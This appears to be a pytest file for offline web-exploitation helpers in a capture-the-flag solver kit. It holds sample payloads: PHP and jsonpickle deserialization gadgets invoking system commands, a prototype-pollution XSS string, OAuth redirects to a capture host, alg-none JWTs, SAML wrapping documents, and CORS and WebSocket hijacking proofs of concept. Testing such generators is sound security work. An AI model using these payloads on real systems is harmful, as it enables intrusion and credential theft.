#!/usr/bin/env python3
"""Synthetic, transport-free tests for the round-three web depth engines."""

from __future__ import annotations

import base64
import json
import re
import sys
import urllib.parse
import xml.etree.ElementTree as ET
from pathlib import Path

import pytest


REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "solvers" / "web"))
import authflow_exploit as authflow  # noqa: E402
import clientside_exploit as clientside  # noqa: E402
import deser_gadgets as deser  # noqa: E402


def _b64json(value: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(value, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


def test_deser_static_detection_and_cross_language_candidates_are_offline():
    source = r"""
    <?php class Worker { function __destruct(){ system($this->command); } }
    import jsonpickle; yaml.load(value, Loader=yaml.UnsafeLoader)
    Marshal.load(blob); ERB.new(template)
    JsonConvert.DeserializeObject(x, new Settings { TypeNameHandling = TypeNameHandling.All });
    new ObjectInputStream(in).readObject(); // commons-collections
    """
    result = deser.synthesize(source, "printf MARKER", ["php", "python", "ruby", "dotnet", "java"])
    assert set(result["detected"]) == {"php", "python", "ruby", "dotnet", "java"}
    assert result["executed"] is False and result["network_requests"] == 0
    rows = result["candidates"]
    assert [row["rank"] for row in rows] == list(range(1, len(rows) + 1))
    assert all(row["candidate_only"] and row["offline"] and not row["executed"] for row in rows)

    php = next(row for row in rows if row["name"] == "magic_method_object")["value"]
    match = re.fullmatch(r'O:(\d+):"([^"]+)":1:\{s:(\d+):"([^"]+)";s:(\d+):"([^"]+)";\}', php)
    assert match and int(match[1]) == len(match[2].encode())
    assert int(match[3]) == len(match[4].encode())
    assert int(match[5]) == len(match[6].encode())

    jsonpickle = next(row for row in rows if row["name"] == "jsonpickle_reduce")["value"]
    assert json.loads(jsonpickle)["py/reduce"][0]["py/function"] == "os.system"
    dotnet = next(row for row in rows if row["name"] == "jsonnet_object_data_provider")["value"]
    assert json.loads(dotnet)["MethodName"] == "Start"
    java = next(row for row in rows if row["language"] == "java")
    assert json.loads(java["value"])["module"].endswith("java_deser.py")


def test_deser_bounds_and_guarded_cli(tmp_path, capsys):
    with pytest.raises(deser.DeserInputError, match="exceeds"):
        deser.synthesize("x" * (deser.MAX_SOURCE + 1), "marker")
    with pytest.raises(deser.DeserInputError, match="class name"):
        deser.php_serialize_object("bad-name", {})
    path = tmp_path / "sample.py"
    path.write_text("import jsonpickle\n")
    assert deser.main([str(path), "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["offline"] is True
    assert deser.main([str(tmp_path / "absent"), "--json"]) == 2
    captured = capsys.readouterr()
    assert captured.err.startswith("deser_gadgets: ") and "Traceback" not in captured.err


def test_php_magic_method_auto_nests_a_source_supported_one_hop_chain():
    source = """<?php
      class Trigger { function __destruct(){ $this->worker->run(); } }
      class Worker { function run(){ system($this->command); } }
    """
    rows = deser.php_magic_chains(source, "printf MARKER")
    assert len(rows) == 1 and rows[0]["name"] == "nested_destruct_Trigger_Worker"
    payload = rows[0]["value"]
    assert 'O:7:"Trigger"' in payload and 'O:6:"Worker"' in payload
    assert 's:7:"command";s:13:"printf MARKER";' in payload
    assert rows[0]["network_requests"] == 0 and rows[0]["executed"] is False


def test_prototype_pollution_maps_sources_to_detected_sinks():
    source = "const cfg=_.merge({}, qs.parse(location.search)); node.innerHTML=cfg.html;"
    report = clientside.analyze_prototype_pollution(source)
    assert {row["name"] for row in report["sources"]} >= {"lodash_merge", "query_parser"}
    assert {row["name"] for row in report["sinks"]} == {"innerHTML"}
    assert report["flows"] == [{
        "source_variable": "cfg",
        "source": "const cfg=_.merge({}, qs.parse(location.search))",
        "sink": "innerHTML",
        "sink_evidence": ".innerHTML=cfg.html",
    }]
    assert len(report["candidates"]) == 3
    query = next(row for row in report["candidates"] if row["name"] == "query_proto_innerHTML")
    parsed = urllib.parse.parse_qs(urllib.parse.urlsplit(query["value"]).query)
    assert parsed["__proto__[innerHTML]"] == ["<img src=x onerror=alert(document.domain)>"]
    body = next(row for row in report["candidates"] if row["name"] == "json_proto_innerHTML")
    assert json.loads(body["value"])["__proto__"]["innerHTML"].startswith("<img")
    assert all(row["network_requests"] == 0 and not row["browser_started"]
               for row in report["candidates"])


def test_csp_finder_handles_allowlists_nonce_and_hardening_gaps():
    csp = "default-src 'self'; script-src 'nonce-abc' 'strict-dynamic' https://*.google.com"
    document = '<script nonce="abc">boot()</script><script nonce="abc">more()</script>' \
               '<script>const s=document.createElement("script"); s.src=location.hash</script>'
    report = clientside.analyze_csp(csp, document)
    names = {row["name"] for row in report["candidates"]}
    assert {"missing_base_uri", "missing_object_src", "reused_nonce",
            "allowlisted_jsonp_www_google_com", "strict_dynamic_loader_gadget"} <= names
    assert report["missing_hardening"] == ["base-uri", "object-src"]
    assert all(row["candidate_only"] and row["network_requests"] == 0
               for row in report["candidates"])
    with pytest.raises(clientside.ClientInputError, match="control"):
        clientside.parse_csp("script-src 'self'\nX: y")


def test_clientside_guarded_cli(capsys):
    assert clientside.main(["--csp", "script-src 'unsafe-inline'", "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["csp"]["offline"] is True
    assert clientside.main([]) == 2
    assert "Traceback" not in capsys.readouterr().err


def test_oauth_redirect_candidates_are_ranked_and_never_sent():
    rows = authflow.redirect_uri_candidates("https://app.test/oauth/callback", "https://player.invalid/capture")
    assert {row["name"] for row in rows} >= {"query_forward", "userinfo_confusion", "encoded_traversal"}
    assert [row["rank"] for row in rows] == list(range(1, len(rows) + 1))
    assert all(row["offline"] and not row["sent"] and row["network_requests"] == 0 for row in rows)
    loopback = authflow.redirect_uri_candidates("https://[::1]/cb", "https://player.invalid/")
    candidate = next(row for row in loopback if row["name"] == "loopback_port_variation")
    assert candidate["value"] == "https://[::1]:49152/cb"
    with pytest.raises(authflow.AuthFlowInputError, match="must use"):
        authflow.redirect_uri_candidates("javascript:alert(1)", "https://player.invalid/")


def test_saml_xsw_documents_are_well_formed_and_use_placeholders():
    rows = authflow.saml_xsw_candidates(
        "https://idp.test/", "https://sp.test/", "candidate@example.test", "https://sp.test/acs"
    )
    assert len(rows) == 3
    for row in rows:
        root = ET.fromstring(row["value"])
        assertions = root.findall(".//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
        assert len(assertions) == 2
        ids = [item.attrib["ID"] for item in assertions]
        assert len(set(ids)) == 2
        assert "REPLACE_WITH_REAL_SIGNATURE" in row["value"]
        assert row["candidate_only"] and row["network_requests"] == 0
    with pytest.raises(authflow.AuthFlowInputError, match="XML 1.0"):
        authflow.build_saml_xsw("https://idp.test/\uffff", "aud", "sub", "https://sp.test/acs")


def test_id_token_confusion_candidates_decode_and_rewrite_claims():
    token = _b64json({"alg": "RS256", "typ": "JWT"}) + "." + _b64json(
        {"iss": "https://idp.test", "sub": "7", "aud": "old-client"}
    ) + ".signature"
    rows = authflow.id_token_confusion_candidates(token, "new-client")
    assert {row["name"] for row in rows} == {
        "alg_none_audience", "algorithm_confusion_unsigned_template", "audience_array_without_azp"
    }
    header, claims = authflow.decode_id_token(rows[0]["value"])
    assert header["alg"] == "none" and claims["aud"] == "new-client"
    assert rows[0]["value"].endswith(".")
    with pytest.raises(authflow.AuthFlowInputError, match="three compact"):
        authflow.decode_id_token("not-a-token")


def test_cors_and_cswsh_pocs_escape_script_text_and_cli_is_guarded(capsys):
    cors = authflow.build_credentialed_cors_poc(
        "https://target.test/api", "POST", "</script><script>alert(1)</script>"
    )
    assert '"credentials":"include"' in cors
    assert cors.count("</script>") == 1
    assert "\\u003c/script\\u003e" in cors
    ws = authflow.build_cswsh_poc("wss://target.test/socket", "marker")
    assert "new WebSocket" in ws and "ws.send" in ws
    assert authflow.credentialed_cors_candidates("https://target.test/api")[0]["rank"] == 1
    assert authflow.cswsh_candidates("wss://target.test/socket")[0]["network_requests"] == 0
    assert authflow.main(["redirect", "https://app.test/cb", "https://player.invalid/", "--json"]) == 0
    assert isinstance(json.loads(capsys.readouterr().out), list)
    assert authflow.main(["cors", "file:///etc/passwd", "--json"]) == 2
    captured = capsys.readouterr()
    assert captured.err.startswith("authflow_exploit: ") and "Traceback" not in captured.err
